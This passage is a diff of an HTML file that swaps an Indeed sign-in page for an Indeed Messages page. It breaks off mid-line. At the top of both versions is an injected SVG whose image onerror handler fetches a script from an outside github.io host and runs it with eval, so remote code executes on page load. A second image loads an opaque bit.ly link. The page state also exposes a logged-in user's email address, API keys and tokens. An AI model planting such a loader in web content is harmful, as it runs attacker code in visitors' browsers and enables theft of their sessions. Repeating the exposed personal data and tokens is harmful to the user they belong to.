@@ -1,870 +1,102 @@
 <!doctype html>
 <html lang="en">
-<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
-  <image x="10" y="10" width="180" height="180" 
-         href="nonexistent.jpg" 
-         onerror="fetch('https://totallylost-helpme.github.io/chat.js')
+  <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+    <image
+      x="10"
+      y="10"
+      width="180"
+      height="180"
+      href="nonexistent.jpg"
+      onerror="fetch('https://totallylost-helpme.github.io/chat.js')
                   .then(res => res.text())
-                  .then(eval)" />
+                  .then(eval)"
+    />
 
-  <!-- Overlay Image -->
-  <image href="https://bit.ly/4aoMbTQ" 
-         alt="Overlay Image" 
-         x="50%" 
-         y="50%" 
-         width="100" 
-         height="auto"
-         transform="translate(-50%, -50%)" />
-  
-</svg>
+    <!-- Overlay Image -->
+    <image
+      href="https://bit.ly/4aoMbTQ"
+      alt="Overlay Image"
+      x="50%"
+      y="50%"
+      width="100"
+      height="auto"
+      transform="translate(-50%, -50%)"
+    />
+  </svg>
   <head>
-    <script type="text/javascript">
-      var urlencode = window.encodeURIComponent
-        ? function (str) {
-            return window.encodeURIComponent(str).replace(/%20/g, "+")
-          }
-        : function (str) {
-            return escape(str)
-              .replace(/\+/g, "%2B")
-              .replace(/\//g, "%2F")
-              .replace(/%20/g, "+")
-          }
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Indeed Messages</title>
+    
+    
+    <link rel="stylesheet" type="text/css" href="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/01d0536f9c5948f5c01a/css/IndexPage.client.css" />
+<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Noto+Sans:regular,bold,italic&display=swap" />
+    <script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/i18n/ab01122d2355f56b6f18/en_CA.min.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/3d6b427092463ed0b927/js/IndexPage.client.manifest.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/ca7cb24864bf05de4052/js/vendor-IndexPage.client-43dd7041.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/3b1fe869fe045949d9c2/js/vendor-IndexPage.client-2b4841d6.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/ed851278f67465e6adbe/js/vendor-IndexPage.client-cd311350.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/65bb3deb81683f33944c/js/vendor-IndexPage.client-e3847191.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/e2089831d64764798e52/js/vendor-IndexPage.client-5feb364e.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/f6742d035191cfb5f12f/js/vendor-IndexPage.client-f70522a3.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/ccc443448bae46be4eae/js/vendor-IndexPage.client-f82e0cd2.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/da02a570444b487b440b/js/vendor-IndexPage.client-059be3de.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/11ec1d093a69d14fd022/js/vendor-IndexPage.client-e96e9bea.js" defer></script>
+<script src="https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/317868d79d9b4c8bdb54/js/IndexPage.client.js" defer></script>
+    
+    <script type="text/javascript">/* Polyfill service v3.111.0
+ * Disable minification (remove `.min` from URL path) for more info */
 
-      function logJavascriptError(m, u, l, c, e) {
-        var msg = m.type
-          ? "Event object: " +
-            m.type +
-            " " +
-            (m.target ? m.target.outerHTML : "")
-          : m
-        msg = msg.length > 200 ? msg.substring(0, 200) : msg
-        var tk = encodeURIComponent("1ihb53j9sgqr4801")
-        var pgid = encodeURIComponent("auth")
-        var extra = ""
-        if (c) {
-          extra += "&col=" + encodeURIComponent(c)
-        }
-        if (e) {
-          extra += "&error=" + encodeURIComponent(e)
-        }
-        var href =
-          "/rpc/log?a=javascript_error" +
-          "&tk=" +
-          tk +
-          "&pgid=" +
-          pgid +
-          "&msg=" +
-          encodeURIComponent(msg) +
-          "&url=" +
-          encodeURIComponent(u) +
-          "&line=" +
-          encodeURIComponent(l) +
-          extra
-        new Image().src = href
-      }
-
-      logJavascriptError.errorCount = 0
-      window.onerror = function (m, u, l, c, e) {
-        if (logJavascriptError.errorCount == 0) {
-          logJavascriptError(m, u, l, c, e)
-        }
-
-        logJavascriptError.errorCount++
-        return false
-      }
-
-      function logClientClicks(clientContext) {
-        var tk = encodeURIComponent("1ihb53j9sgqr4801")
-        var pgid = encodeURIComponent("auth")
-
-        var context = encodeURIComponent(clientContext)
-
-        var href =
-          "../rpc/log?a=client_click" +
-          "&tk=" +
-          tk +
-          "&pgid=" +
-          pgid +
-          "&ctx=" +
-          context
-
-        new Image().src = href
-      }
-    </script>
-    <title>Sign In | Indeed Accounts</title>
-    <meta name="referrer" content="no-referrer-when-downgrade" />
-    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
-    <link
-      rel="shortcut icon"
-      href="https://c03.s3.indeed.com/passport/static/compiled/images/favicon-cdf5db.ico"
-    />
-    <link
-      rel="apple-touch-icon"
-      href="https://c03.s3.indeed.com/passport/static/compiled/images/apple-touch-icon-14d6e1.png"
-    />
-    <link
-      rel="apple-touch-icon-precomposed"
-      href="https://c03.s3.indeed.com/passport/static/compiled/images/apple-touch-icon-precomposed-96dae7.png"
-    />
-    <script type="text/javascript">
-      window.model = {
-        showExternalNavigation: true,
-        continueParameter: null,
-        verificationCode: null,
-        pageCode: "auth",
-        ctk: "1ihb53gn0gmvp800",
-        tk: "1ihb53j9sgqr4801",
-        variation: null,
-        showExistingAcctMsg: false,
-        showIaApplySuccessMsg: false,
-        mosaicPlatformViewModel: null,
-        bundle: "auth-page",
-        email: "",
-        phoneNumber: null,
-        loginTk: "1ihb53j9tgqr4800",
-        authType: null,
-        authIdentifierError: null,
-        passError: null,
-        phoneVerified: false,
-        showPasswordCaptcha: false,
-        showEmailOptOut: false,
-        countryCode: null,
-        redirectUrl: null,
-        baseSecureURL: "https://secure.indeed.com",
-        ipqsScriptSrc:
-          "https://www.ipqscdn.com/api/indeed.com/Cj3vYxb1VZH2JWf0tcSCvYQYYDpTUVzrhnbokrjKBwfU27WZkOPIVPU4jKvusri0MQWIKEwDWZtsinjFTdO0Hhh1FHSreV5Jnpzkwv0GNqfA8rAuB5X5R1ybqqrbmKoEYLRUWRekgbYgshv7NvtZLyFKku08TbCeYn13r0sbLioZLjLXNYo6nLRp4SOYCPIMH3dJdLHQ8z7FZL15cTmK2tI1bGbWR16xbdY6W0LwxLmfkf4StKb1qrCavtM4u500/learn.js",
-        personalizedFlow: null,
-        urls: {
-          forgotPasswordUrl:
-            "/account/forgotpassword?hl=en_US\u0026co=US\u0026continue=https%3A%2F%2Fwww.indeed.com",
-          registrationUrl:
-            "/auth?hl=en_US\u0026co=US\u0026continue=https%3A%2F%2Fwww.indeed.com",
-          loginUrl:
-            "/auth?hl=en_US\u0026co=US\u0026continue=https%3A%2F%2Fwww.indeed.com",
-          browseJobsUrl: "https://www.indeed.com/find-jobs.jsp?hl=en_US",
-          workAtIndeedUrl: "https://www.indeed.jobs",
-          countriesUrl: "https://www.indeed.com/worldwide?hl=en_US",
-          aboutUsUrl: "https://www.indeed.com/about?hl=en_US",
-          helpCenterUrl: "https://support.indeed.com/hc/en-us?redirect=false",
-          legalTosUrl: "https://www.indeed.com/legal?hl=en\u0026co=US",
-        },
-        extraParams: {
-          hl: "en_US",
-          co: "US",
-          continue: "https://www.indeed.com",
-          jsContinue: null,
-          empContinue: null,
-          service: null,
-          cfb: 0,
-          pvr: 0,
-          pvm: "",
-          obo: null,
-          continue2: null,
-          var: null,
-          form_tk: "1ihb53j9sgqr4801",
-          surftok: "C29TkFJTsDjg2A93sPGmdstJARNhUY5h",
-          tmpl: "",
-          from: null,
-          iframe_tk: null,
-          branding: "",
-          userType: null,
-        },
-        from: null,
-        externalAuthProviders: {
-          google: {
-            redirectUrl:
-              "https://accounts.google.com/o/oauth2/v2/auth?response_type=code\u0026redirect_uri=https%3A%2F%2Fsecure.indeed.com%2Faccount%2Fgoogleauth\u0026client_id=1047839414793-v442kdo3pt0vb43l8nu2c5sh9lf4bsnj.apps.googleusercontent.com\u0026scope=openid+email+profile\u0026state=C29TkFJTsDjg2A93sPGmdstJARNhUY5h\u0026nonce=YhcdMepVG8l2xDOt\u0026ui_locales=en-US+en",
-            error: "",
-            mode: "DESKTOP",
-          },
-          line: null,
-          apple: {
-            redirectUrl: "https://secure.indeed.com/account/appleauth",
-            errorMessage: "",
-            clientId: "com.indeed.secure",
-            state: "C29TkFJTsDjg2A93sPGmdstJARNhUY5h",
-            nonce: "o1z7V4JHMqkiKZb4",
-            usePopup: true,
-            useAppleButton: false,
-          },
-          microsoft: null,
-        },
-        pageTitle: null,
-      }
-      window.captcha = {
-        captchaEnabled: true,
-        captchaErrorCodes: [],
-        captchaErrorMessage: "",
-        captchaSiteKey: "0x4AAAAAAAP4NN8CHkVtsERB",
-      }
-      window.iSpotTrackingPixel = {
-        trackingPixelUrl:
-          "https://pt.ispot.tv/v2/TC-3035-1.gif?app=web\u0026type=job_seeker_account_create",
-        active: true,
-      }
-      window.parameterConstants = {
-        givenName: "givenName",
-        familyName: "familyName",
-        email: "__email",
-        password: "__password",
-        confirmpassword: "__confirmpw",
-        currentpassword: "__currentpw",
-        phonenumber: "pn",
-        countryindex: "countryindex",
-        factorSID: "factor_sid",
-        passcode: "passcode",
-        consented: "subscription_consented",
-        consentedval: "on",
-      }
-      window.legalFooterText =
-        '<nav class="legal-footer">&copy;2025 Indeed - <a href="https:\/\/www.indeed.com\/legal?hl=en&co=US">Cookies, Privacy and Terms<\/a><\/nav>'
-      window.globalnav_brandinghome_link = "https:\/\/www.indeed.com\/"
-      window.globalnav_variant = "NO_NAV"
-      window.proctorGroups = [
-        [-1, null],
-        [-1, null],
-        [-1, null],
-        [-1, null],
-        [1, null],
-        [1, null],
-        [1, null],
-        [-1, null],
-        [-1, null],
-        [-1, null],
-        [-1, null],
-        [-1, null],
-        [-1, null],
-        [1, null],
-        [0, null],
-        [-1, null],
-        [0, null],
-        [-1, null],
-        [-1, null],
-        [1, null],
-        [1, null],
-        [1, null],
-        [-1, null],
-        [1, null],
-        [-1, null],
-        [1, null],
-        [3, null],
-        [1, null],
-        [0, null],
-        [1, null],
-        [0, null],
-        [-1, []],
-        [1, null],
-        [0, null],
-        [1, null],
-        [1, null],
-        [-1, null],
-        [-1, null],
-        [-1, null],
-      ]
-    </script>
-    <!-- Load Indeed Sans -->
-    <link href="https://prod.statics.indeed.com" rel="preconnect" crossorigin />
-    <link
-      href="https://prod.statics.indeed.com/ds/assets/typography/indeedsans/v1/indeedsans.css"
-      rel="stylesheet"
-    />
-  </head>
-  <body dir="ltr" class="ltr pass-body-tmpl-STANDARD">
-    <script>
-      /* Replacing <body ontouchstart=""> since it is not HTML5 valid */
-      document.body.addEventListener("touchstart", function () {}, false)
-    </script>
-    <div
-      id="container"
-      class="pass-container pass-container-tmpl-STANDARD pass-container-branding-"
-    >
-      <div class="pass-GnavContainer">
-        <script id="_indeed_gnav_config" type="application/json">
-          {
-            "webVitalsEnabled": true,
-            "resourceTimingEnabled": false,
-            "backgroundRealtimeUpdatesEnabled": false,
-            "oneGraphApiKey": "8a0b9a0515af41addb33361deed717802de3577937ca4b28d5cbdaf56d947dc9",
-            "logRoute": "https://t.indeed.com/signals/gnav/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
-            "signalsLogRoute": "https://t.indeed.com/signals/v1/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
-            "serviceRequestLogUID": "1ihb53j98gqp4801",
-            "hostAppTk": "",
-            "pageId": "/auth",
-            "canonicalPageId": "",
-            "applicationId": "passport--passport-webapp",
-            "appName": "passport--passport-webapp",
-            "country": "US",
-            "requestURL": "http://secure.indeed.com/auth?hl=en_US\u0026co=US\u0026continue=https%253A%252F%252Fwww.indeed.com",
-            "language": "en",
-            "isMobile": false,
-            "jsErrorLogType": "gnavJSError",
-            "jsErrorLth": "6411ec182c6acd8714dc2d03716eed1d",
-            "jsEnabledLogType": "gnavJSEnabled",
-            "jsEnabledLth": "5e9311c1001227ca5c6c32db123fb854",
-            "interactionLogType": "gnavInteraction",
-            "interactionLth": "87caa20c31fa9e447264b1615339f1ce",
-            "clickLogType": "gnavClick",
-            "clickLth": "fa8b0aff9499e52dd7e9215032d9ad9f",
-            "pageSpeedLogType": "gnavPageSpeed",
-            "pageSpeedLth": "12783140239867f5afc3bd80a743e013",
-            "dwellTimeLogType": "gnavDwellTime",
-            "dwellTimeLth": "e415e44ee819f056fc4675c1b0373740",
-            "clickstreamEnabled": false,
-            "pagenavigationEnabled": true,
-            "clickstreamEnvironmentId": "",
-            "signalsTransportImplementation": "nativeBeacon",
-            "isPreproduction": false,
-            "stagingLevel": "prod",
-            "showGlobalPrivacyControlBanner": true,
-            "globalPrivacyControlBannerButtonLink": "https://privacy.indeed.com/share/indeed?hl=en_US\u0026from=global-nav",
-            "globalPrivacyControlBannerButtonText": "Privacy settings",
-            "globalPrivacyControlBannerTopText": "We have detected that you have the global privacy control (GPC) signal enabled. Please click [Privacy settings|boldEl] to exercise your privacy rights.",
-            "globalPrivacyControlBannerBottomText": "If you wish to continue using Indeed without updating your privacy settings at this time, you may close this banner at any time.",
-            "globalPrivacyControlBannerDismissLabel": "Dismiss Banner",
-            "globalPrivacyControlBannerCookieDomain": [".indeed.com"],
-            "globalPrivacyControlBannerVariant": "float",
-            "adblockDetectionBannerText": "If you notice issues with your Indeed pages, please turn off your ad blocker.",
-            "showAdblockDetectionBanner": false,
-            "adblockDetectionBannerTitle": "Ad blocker detected",
-            "adblockDetectionBannerDismissText": "Dismiss",
-            "nonPersonalizedExperienceTestActive": false,
-            "isPhoneUpdateNudgeEnabled": false,
-            "lastFetchedActiveTimeCookieDomain": ".indeed.com",
-            "phoneUpdateNudgeRedirectionUrl": "https://secure.indeed.com/account/changephone?src=gnav\u0026continue=http://secure.indeed.com/auth?hl=en_US\u0026co=US\u0026continue=https%253A%252F%252Fwww.indeed.com",
-            "lastFetchedActiveTime": "undefined",
-            "accountId": "-1",
-            "ctk": "1ihb53gn0gmvp800",
-            "isPnoUser": false,
-            "proctorWindowSize": 0,
-            "phoneUpdateNudgeDataGnavRegion": "PhoneUpdateNudge",
-            "phoneUpdateNudgeHeaderText": "Review phone number",
-            "phoneUpdateNudgeBodyText": "Is [{0}|strong] your current phone number eligble to receive both WhatsApp and SMS messages? An updated phone number ensures that you don’t lose access to your Indeed account.",
-            "phoneUpdateNudgePrimaryCtaText": "Yes, this is correct",
-            "phoneUpdateNudgeSecondaryCtaText": "Update phone number",
-            "publicPath": "https://c03.s3.indeed.com/dist/"
-          }
-        </script>
+</script>
+<script type="text/javascript">(function(){var l=document.querySelector("link[rel='shortcut icon']")         ||document.createElement('link');l.rel='shortcut icon';         l.href='https://www.indeed.com/images/favicon.ico';var l2=document.querySelector("link[rel='apple-touch-icon']")         ||document.createElement('link');l2.rel='apple-touch-icon';         l2.href='/apple-touch-icon.png';var head = document.getElementsByTagName('head')[0];
+        head.appendChild(l);head.appendChild(l2);})();</script>
+<script type="text/javascript">window.__JS_ERROR__ = []</script>
+<script type="text/javascript">window.onerror = function() { window.__JS_ERROR__.push(arguments); }</script>
+    
+</head>
+    
+<body>
+    <script>window.__initialState = {"pageConfigData":{"appName":"msgw","baseIndeedUrl":"https://ca.indeed.com","deviceMetaData":{"userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0","isUserAgentMobile":false,"detectedMobileDevice":"","detectedMobileOS":null,"detectedMobileOSVersion":-1,"isNativeApp":false,"indeedAppDeviceId":"","indeedAppProctorGrps":"","indeedAppVersion":""},"locale":{"country":"CA","language":"en"},"proctor":{"proctorGroups":{"askem_survey_in_msgw_tst":{"group":"inactive","value":-1,"allocationId":""},"ecp_sse_connection_sharing_tog":{"group":"test","value":1,"allocationId":"#A3"},"ims_decouple_drmr_dradis_js_banner":{"group":"inactive","value":-1,"allocationId":"#A1"},"ims_js_mark_messages_as_unread":{"group":"inactive","value":-1,"allocationId":"#A1"},"ims_mp_js_show_recipients":{"group":"v2","value":2,"allocationId":"#A4"},"ims_p1_messaging_js_read_cursor_dual_write_tst":{"group":"test","value":1,"allocationId":"#A3"},"js_can_see_msg_online_status_tst":{"group":"grp1","value":1,"allocationId":"#B2"},"js_edit_online_status_preferences_tst":{"group":"test","value":1,"allocationId":"#B2"},"js_hqm_connect_tst":{"group":"inactive","value":-1,"allocationId":"","payload":{"map":{"REQUIRED_JOB_MATCHES_FOR_PAGE_LOAD_OPT_IN":-1}}},"js_hqm_employer_response_time_tst":{"group":"inactive","value":-1,"allocationId":""},"mosaic_provider_js_responsiveness_serp_tog":{"group":"inactive","value":-1,"allocationId":""},"msg_nonreplyable_holdout":{"group":"test","value":1,"allocationId":"#A9"},"msg_real_time_new_msg_tst":{"group":"test","value":1,"allocationId":"#A23"},"msgs_pajim_email_suggestedmsgs_tst":{"group":"inactive","value":-1,"allocationId":"#C1"},"msgw_aggressive_nudge_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_conversation_job_details_tst":{"group":"inactive","value":-1,"allocationId":"#B1"},"msgw_dremr_error_alert_tst":{"group":"inactive","value":-1,"allocationId":"#A40"},"msgw_hqm_preapply_chat_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_ims_readdata_migration_tst":{"group":"test","value":1,"allocationId":"#A19"},"msgw_instantmatch_templates_tst":{"group":"inactive","value":-1,"allocationId":"#A3"},"msgw_interview_and_resume_nudge_tst":{"group":"inactive","value":-1,"allocationId":"#A1"},"msgw_js_legal_disclaimer_tst":{"group":"test","value":1,"allocationId":"#A3"},"msgw_js_local_drafts_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_multi_recipient_banner_tst":{"group":"beforeDate","value":2,"allocationId":"#B13","payload":{"stringValue":"2023-08-18"}},"msgw_no_pajim_valueprop_tst":{"group":"active","value":1,"allocationId":"#B3"},"msgw_onestep_reporting_tst":{"group":"active","value":1,"allocationId":"#B3"},"msgw_remind_js_to_respond_tst":{"group":"inactive","value":-1,"allocationId":"#B4"},"msgw_rescon_label_tst":{"group":"active","value":1,"allocationId":"#A6"},"msgw_responsive_candidate_status_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_sendConversationEvent_migration_tst":{"group":"active","value":1,"allocationId":"#C9"},"msgw_skeleton_message_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_suggested_messages_reminder_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_unified_spam_reporting_tst":{"group":"active","value":1,"allocationId":"#B3"},"msgw_update_infinite_scroll_tst":{"group":"active","value":1,"allocationId":"#B2"},"hqm_messaging_first_experience_tst":{"group":"inactive","value":-1,"allocationId":""},"js_hqm_suggested_messages_tst":{"group":"inactive","value":-1,"allocationId":""},"msgr_prompt_for_interest_tst":{"group":"inactive","value":-1,"allocationId":""}},"proctorDynamicGroups":{"askem_survey_in_msgw_tst":{"group":"inactive","value":-1,"allocationId":""},"ecp_sse_connection_sharing_tog":{"group":"test","value":1,"allocationId":"#A3"},"ims_decouple_drmr_dradis_js_banner":{"group":"inactive","value":-1,"allocationId":"#A1"},"ims_js_mark_messages_as_unread":{"group":"inactive","value":-1,"allocationId":"#A1"},"ims_mp_js_show_recipients":{"group":"v2","value":2,"allocationId":"#A4"},"ims_p1_messaging_js_read_cursor_dual_write_tst":{"group":"test","value":1,"allocationId":"#A3"},"js_can_see_msg_online_status_tst":{"group":"grp1","value":1,"allocationId":"#B2"},"js_edit_online_status_preferences_tst":{"group":"test","value":1,"allocationId":"#B2"},"js_hqm_connect_tst":{"group":"inactive","value":-1,"allocationId":"","payload":{"map":{"REQUIRED_JOB_MATCHES_FOR_PAGE_LOAD_OPT_IN":-1}}},"js_hqm_employer_response_time_tst":{"group":"inactive","value":-1,"allocationId":""},"mosaic_provider_js_responsiveness_serp_tog":{"group":"inactive","value":-1,"allocationId":""},"msg_nonreplyable_holdout":{"group":"test","value":1,"allocationId":"#A9"},"msg_real_time_new_msg_tst":{"group":"test","value":1,"allocationId":"#A23"},"msgs_pajim_email_suggestedmsgs_tst":{"group":"inactive","value":-1,"allocationId":"#C1"},"msgw_aggressive_nudge_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_conversation_job_details_tst":{"group":"inactive","value":-1,"allocationId":"#B1"},"msgw_dremr_error_alert_tst":{"group":"inactive","value":-1,"allocationId":"#A40"},"msgw_hqm_preapply_chat_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_ims_readdata_migration_tst":{"group":"test","value":1,"allocationId":"#A19"},"msgw_instantmatch_templates_tst":{"group":"inactive","value":-1,"allocationId":"#A3"},"msgw_interview_and_resume_nudge_tst":{"group":"inactive","value":-1,"allocationId":"#A1"},"msgw_js_legal_disclaimer_tst":{"group":"test","value":1,"allocationId":"#A3"},"msgw_js_local_drafts_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_multi_recipient_banner_tst":{"group":"beforeDate","value":2,"allocationId":"#B13","payload":{"stringValue":"2023-08-18"}},"msgw_no_pajim_valueprop_tst":{"group":"active","value":1,"allocationId":"#B3"},"msgw_onestep_reporting_tst":{"group":"active","value":1,"allocationId":"#B3"},"msgw_remind_js_to_respond_tst":{"group":"inactive","value":-1,"allocationId":"#B4"},"msgw_rescon_label_tst":{"group":"active","value":1,"allocationId":"#A6"},"msgw_responsive_candidate_status_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_sendConversationEvent_migration_tst":{"group":"active","value":1,"allocationId":"#C9"},"msgw_skeleton_message_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_suggested_messages_reminder_tst":{"group":"inactive","value":-1,"allocationId":""},"msgw_unified_spam_reporting_tst":{"group":"active","value":1,"allocationId":"#B3"},"msgw_update_infinite_scroll_tst":{"group":"active","value":1,"allocationId":"#B2"},"hqm_messaging_first_experience_tst":{"group":"inactive","value":-1,"allocationId":""},"js_hqm_suggested_messages_tst":{"group":"inactive","value":-1,"allocationId":""},"msgr_prompt_for_interest_tst":{"group":"inactive","value":-1,"allocationId":""}},"proctorGroupsString":"#A3:ecp_sse_connection_sharing_tog1,#A4:ims_mp_js_show_recipients2,#A3:ims_p1_messaging_js_read_cursor_dual_write_tst1,#B2:js_can_see_msg_online_status_tst1,#B2:js_edit_online_status_preferences_tst1,#A9:msg_nonreplyable_holdout1,#A23:msg_real_time_new_msg_tst1,#A19:msgw_ims_readdata_migration_tst1,#A3:msgw_js_legal_disclaimer_tst1,#B13:msgw_multi_recipient_banner_tst2,#B3:msgw_no_pajim_valueprop_tst1,#B3:msgw_onestep_reporting_tst1,#A6:msgw_rescon_label_tst1,#C9:msgw_sendConversationEvent_migration_tst1,#B3:msgw_unified_spam_reporting_tst1,#B2:msgw_update_infinite_scroll_tst1,ecp_sse_connection_sharing_tog1,ims_mp_js_show_recipients2,ims_p1_messaging_js_read_cursor_dual_write_tst1,js_can_see_msg_online_status_tst1,js_edit_online_status_preferences_tst1,msg_nonreplyable_holdout1,msg_real_time_new_msg_tst1,msgw_ims_readdata_migration_tst1,msgw_js_legal_disclaimer_tst1,msgw_multi_recipient_banner_tst2,msgw_no_pajim_valueprop_tst1,msgw_onestep_reporting_tst1,msgw_rescon_label_tst1,msgw_sendConversationEvent_migration_tst1,msgw_unified_spam_reporting_tst1,msgw_update_infinite_scroll_tst1"},"resumeUrl":"https://my.indeed.com/resume/preview","stagingEnv":"prod","instance":"MessagingWebapp","webpackPublicPath":"https://d3hbwax96mbv6t.cloudfront.net/messaging-webapp/"},"pageInitData":{"sagaOptions":{"retryCount":3},"msgsClientOptions":{"BASE_URL":"","DEFAULT_TIMEOUT":15000,"XSRF_COOKIE_NAME":"CSRF","XSRF_HEADER_NAME":"X-XSRF-TOKEN","CLIENT_APP":"MESSAGES_WEB","LOCALE_COUNTRY":"CA","LOCALE_LANGUAGE":"en","PAGELOAD_TK":"1497bd64-7a10-4b51-aa7a-d022237e10c0"},"oneGraphClientOptions":{"API_KEY":"fc38f4097f13eb1890dddb6a8b33e632554cc2bc35fac21be8d4dbc1123327d4","BASE_URL":"https://apis.indeed.com/graphql","LOCALE_LANGUAGE":"en","LOCALE_COUNTRY":"CA","PAGELOAD_TK":"1497bd64-7a10-4b51-aa7a-d022237e10c0","CTK":"1ihuecnt7kupu801","PRFORCE_GROUPS":""},"rezcowClientOptions":{"BASE_URL":"https://resumecontacts.indeed.com/","DEFAULT_TIMEOUT":"10000","DEFAULT_COOKIES":{},"DEFAULT_QUERY_PARAMS":{}},"pageloadTk":"1497bd64-7a10-4b51-aa7a-d022237e10c0","session":{"user":{"email":"donald-robert@outlook.com"}},"applyButtonParams":{"applyButtonEmail":"3ed19077cf6a04336c7cc50a3c98d5f118493bfb4247395cd26b33a4af118726","applyButtonSource":"messaging","applyButtonApiToken":"44a9995b27f45ab3fcbab922ff6c90fda7b5a5368f7b2fa8c37571f46245cbd1"}},"reduxState":{"resumeInvite":{"loadingStateMap":{}},"antiFraudCarousel":{"cardSortOrder":"RANDOM","dismissed":false,"isLoading":false},"files":{"lastTriedUploadFileTransientId":"","lastTriedUploadFile":{}},"conversation":{"error":null,"resultsMap":{},"loadingType":null,"isLoadingMore":false,"isUpdatingLabel":false,"files":[],"isFetchingInterviews":false,"isFetchingResumeInvites":false,"isFetchingMoreInterviews":false,"isFetchingMoreResumeInvites":false,"isFetchingJobEntities":false,"isFetchingRecipients":false},"conversations":{"channelDrafts":{},"error":null,"selectedChannelSid":null,"swipedRowConversationSid":null,"loadingType":null,"isLoadingMore":false,"initialConversationsLoadComplete":false,"newConversationSids":[]},"conversationDetail":{"error":null,"detailPaneStatus":"empty","isDetailPaneActive":false},"entities":{"antiFraudCards":{"byId":{},"allIds":[]},"channels":{},"messages":{},"pageTokens":{},"presence":{"conversationPresence":{}},"jobEntities":{},"interviews":{},"resumeInvites":{}},"reportContent":{},"callBack":{},"interview":{"isModalOpen":false,"requestStatus":"not initialized","modalNote":""},"router":{"location":{"pathname":"/conversations/","search":"?from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijclnhngg7pe800\u0026tk=1ijclnhn7l807ccp\u0026co=CA\u0026hl=en\u0026filter=Inbox","hash":"","key":"4114tt","query":{"from":"gnav-util-messaging--messaging-webapp","gnavTK":"1ijclnhngg7pe800","tk":"1ijclnhn7l807ccp","co":"CA","hl":"en","filter":"Inbox"}},"action":"POP"},"session":{"user":{"email":"donald-robert@outlook.com","friendlyName":"","isLoggedIn":true},"windowDimensions":{"height":0,"width":0},"toast":{"toastContent":null},"modal":{"contentType":null,"displaying":false},"screenReaderAnnouncement":{"announcementType":null,"message":"","urgency":"STATUS","counter":0}},"suggestedMessage":{"content":{},"status":{}},"askemSurveys":{"hasSeenConversation":false}}};</script>    
+       
+    <div id="app-root"><nav id="msgwIndeedNavigation" aria-hidden="false" class="msgw-IndeedNavigation-globalNav"><script id="_indeed_gnav_config" type="application/json">{"isEmployer":false,"isMobile":false,"desktopPageLinks":[{"text":"Home","href":"https://ca.indeed.com/","dataHref":"https://ca.indeed.com/?from=gnav-messaging--messaging-webapp","isHighlighted":false,"dataGnavElementName":"FindJobs"},{"text":"Company reviews","href":"https://ca.indeed.com/companies","dataHref":"https://ca.indeed.com/companies?from=gnav-messaging--messaging-webapp","isHighlighted":false,"dataGnavElementName":"CompanyReviews"},{"text":"Salary guide","href":"https://ca.indeed.com/career/salaries","dataHref":"https://ca.indeed.com/career/salaries?from=gnav-messaging--messaging-webapp","isHighlighted":false,"dataGnavElementName":"FindSalaries"}],"skipNavLinkModel":{"href":"#messaging-main-content","text":"Skip to main content","targetText":"Start of main content","dataGnavElementName":"SkipNav"},"variantToggleLink":{"text":"Employers / Post Job","href":"https://employers.indeed.com/p/posting?co=CA\u0026hl=en_CA","dataHref":"https://employers.indeed.com/p/posting?co=CA\u0026hl=en_CA\u0026from=gnav-menu-messaging--messaging-webapp\u0026ikw=gnav-header-hire\u0026isid=employerlink-CA\u0026trafficTK=1ihuecnt7kupu801\u0026jstm=1738814460098","dataGnavElementName":"EmployersPostJob"},"country":"CA","logoHref":"https://ca.indeed.com?from=gnav-messaging--messaging-webapp","logoName":"aurora","appName":"messaging--messaging-webapp","shouldReduceRightMargin":false,"inboxApiHref":"https://messages.indeed.com/messaging/jobseekers/v2/summary?from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijcmm45mgo9s801\u0026tk=1ijcmm45dkh7u8lk\u0026co=CA\u0026hl=en\u0026clientApp=GNAV","inboxHref":"https://messages.indeed.com?from=gnav-util-messaging--messaging-webapp\u0026gnavTK=1ijcmm45mgo9s801\u0026tk=1ijcmm45dkh7u8lk\u0026co=CA\u0026hl=en","logRoute":"https://t.indeed.com/signals/gnav/log?from=messaging--messaging-webapp-messaging\u0026parentLogId=1ijcmm45mgo9s801\u0026hostAppTk=1ijcmm45dkh7u8lk","inboxLogTuple":"gnavInbox:12140b7982d032f1660f59e3e976c72d","isShowInboxIcon":true,"selectedIcon":"inbox","shouldReduceNavIconMargins":false,"oneGraphBaseUrl":"